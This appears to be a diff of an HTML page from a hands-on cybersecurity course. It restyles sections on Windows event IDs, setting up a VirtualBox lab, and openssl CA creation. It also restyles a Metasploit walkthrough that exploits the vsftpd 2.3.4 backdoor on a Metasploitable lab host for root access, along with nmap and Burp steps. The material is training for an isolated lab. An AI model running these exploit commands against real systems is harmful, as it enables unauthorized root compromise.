@@ -121,11 +121,11 @@
     </div>
 
     <div class="section-label">// event log IDs to memorize</div>
-    <div class="command-table">
-      <div class="cmd-row"><code>4624</code><div class="cdesc">Successful logon — first thing SOC analysts check after a breach.</div></div>
-      <div class="cmd-row"><code>4625</code><div class="cdesc">Failed logon — brute-force detection. Spike in 4625 = attack in progress.</div></div>
-      <div class="cmd-row"><code>4688</code><div class="cdesc">Process creation — tracks every new process. Key for detecting malware execution.</div></div>
-      <div class="cmd-row"><code>1102</code><div class="cdesc">Security log cleared — a classic post-exploitation cleanup step. Major red flag.</div></div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">4624</div><div class="cdesc">Successful logon — first thing SOC analysts check after a breach.</div></div>
+      <div class="concept"><div class="ctitle">4625</div><div class="cdesc">Failed logon — brute-force detection. Spike in 4625 = attack in progress.</div></div>
+      <div class="concept"><div class="ctitle">4688</div><div class="cdesc">Process creation — tracks every new process. Key for detecting malware execution.</div></div>
+      <div class="concept"><div class="ctitle">1102</div><div class="cdesc">Security log cleared — a classic post-exploitation cleanup step. Major red flag.</div></div>
     </div>
 
     <div class="section-label">// real incident</div>
@@ -157,11 +157,11 @@
     </div>
 
     <div class="section-label">// critical setup steps</div>
-    <div class="command-table">
-      <div class="cmd-row"><code>VT-x / AMD-V in BIOS</div><div class="cdesc">Must be enabled for 64-bit VMs and nested virtualization. Without it, Kali won't boot.</div></div>
-      <div class="cmd-row"><code>Host-Only adapter → static IPs</div><div class="cdesc">Assign static IPs to every VM. Kali gets .105, Metasploitable gets .101, Windows gets .110.</div></div>
-      <div class="cmd-row"><code>Snapshots before major changes</div><div class="cdesc">Revert to clean state after breaking a VM with a destructive exploit. Saves hours of rebuild.</div></div>
-      <div class="cmd-row"><code>ping 192.168.56.101 from Kali</div><div class="cdesc">First connectivity test. If ping fails, check network adapter settings before proceeding.</div></div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">VT-x / AMD-V in BIOS</div><div class="cdesc">Must be enabled for 64-bit VMs and nested virtualization. Without it, Kali won't boot.</div></div>
+      <div class="concept"><div class="ctitle">Host-Only adapter + static IPs</div><div class="cdesc">Assign static IPs: Kali .105, Metasploitable .101, Windows .110. Keeps lab isolated from LAN.</div></div>
+      <div class="concept"><div class="ctitle">Snapshots before changes</div><div class="cdesc">Revert to clean state after breaking a VM with a destructive exploit. Saves hours of rebuild.</div></div>
+      <div class="concept"><div class="ctitle">ping 192.168.56.101</div><div class="cdesc">First connectivity test from Kali. If ping fails, check network adapter settings before proceeding.</div></div>
     </div>
 
     <div class="section-label">// real incident</div>
@@ -187,15 +187,8 @@
     </div>
 
     <div class="section-label">// vsftpd 2.3.4 exploitation walkthrough</div>
-    <div style="background:var(--bg);border:1px solid var(--edge);border-radius:7px;padding:12px;font-family:'IBM Plex Mono',monospace;font-size:12.5px;color:var(--green);margin-top:8px;">
-msfconsole -q<br>
-search vsftpd<br>
-use exploit/unix/ftp/vsftpd_234_backdoor<br>
-set RHOSTS 192.168.56.101<br>
-check<br>
-exploit<br>
-&nbsp;&nbsp;→ meterpreter shell opens<br>
-id &nbsp;&nbsp;→ uid=0(root) — immediate root access
+    <div class="command-table">
+      <div class="cmd-row"><code>msfconsole -q<br>search vsftpd<br>use exploit/unix/ftp/vsftpd_234_backdoor<br>set RHOSTS 192.168.56.101<br>check<br>exploit</code><div class="cdesc">Full vsftpd backdoor chain. After exploit: meterpreter shell opens with uid=0(root) — immediate root access on Metasploitable 2.</div></div>
     </div>
 
     <div class="section-label">// real incident</div>
@@ -219,15 +212,11 @@ id &nbsp;&nbsp;→ uid=0(root) — immediate root access
     </div>
 
     <div class="section-label">// hands-on — full chain against metasploitable</div>
-    <div style="background:var(--bg);border:1px solid var(--edge);border-radius:7px;padding:12px;font-family:'IBM Plex Mono',monospace;font-size:12.5px;color:var(--green);margin-top:8px;">
-# Step 1: Recon<br>
-nmap -sV -p- 192.168.56.101<br>
-# Step 2: Capture traffic<br>
-wireshark &amp; &nbsp;→ capture on host-only adapter<br>
-# Step 3: Exploit<br>
-msfconsole → use vsftpd_234_backdoor → set RHOSTS → exploit<br>
-# Step 4: Web app test<br>
-Burp Suite → set browser proxy → intercept login form → Repeater
+    <div class="command-table">
+      <div class="cmd-row"><code>nmap -sV -p- 192.168.56.101</code><div class="cdesc">Step 1: Recon — full port scan against Metasploitable 2.</div></div>
+      <div class="cmd-row"><code>wireshark &amp;</code><div class="cdesc">Step 2: Capture traffic on host-only adapter. Filter <code>ftp</code> to see plaintext credentials.</div></div>
+      <div class="cmd-row"><code>msfconsole → use vsftpd_234_backdoor</code><div class="cdesc">Step 3: Exploit — set RHOSTS 192.168.56.101 → exploit → meterpreter.</div></div>
+      <div class="cmd-row"><code>Burp Suite → proxy → intercept</code><div class="cdesc">Step 4: Web app test — configure browser to 127.0.0.1:8080, capture login form, send to Repeater.</div></div>
     </div>
 
     <div class="section-label">// key insight</div>
@@ -347,12 +336,9 @@ Burp Suite → set browser proxy → intercept login form → Repeater
     <p style="font-size:13.5px;color:#cdd6da;"><strong>Root CA → Intermediate CA → Server/Leaf certificate.</strong> Root CAs are self-signed and pre-installed in browsers (~150). Intermediates are signed by roots and issue actual server certs. If a root is compromised, ALL certificates signed by it are untrusted. If an intermediate is compromised, only certificates from that intermediate are affected — this is why the chain exists.</p>
 
     <div class="section-label">// self-signed CA in lab</div>
-    <div style="background:var(--bg);border:1px solid var(--edge);border-radius:7px;padding:12px;font-family:'IBM Plex Mono',monospace;font-size:12.5px;color:var(--green);margin-top:8px;">
-# Create root CA<br>
-openssl req -x509 -newkey rsa:4096 -keyout ca.key -out ca.crt -days 365 -nodes<br>
-# Sign a server cert with it<br>
-openssl req -newkey rsa:2048 -keyout server.key -out server.csr -nodes<br>
-openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -out server.crt -days 365
+    <div class="command-table">
+      <div class="cmd-row"><code>openssl req -x509 -newkey rsa:4096 -keyout ca.key -out ca.crt -days 365 -nodes</code><div class="cdesc">Create root CA with 4096-bit RSA key. -nodes means no passphrase.</div></div>
+      <div class="cmd-row"><code>openssl req -newkey rsa:2048 -keyout server.key -out server.csr -nodes<br>openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -out server.crt -days 365</code><div class="cdesc">Generate a server CSR then sign it with your CA. Two commands: create cert request, then sign.</div></div>
     </div>
 
     <div class="section-label">// real incident</div>
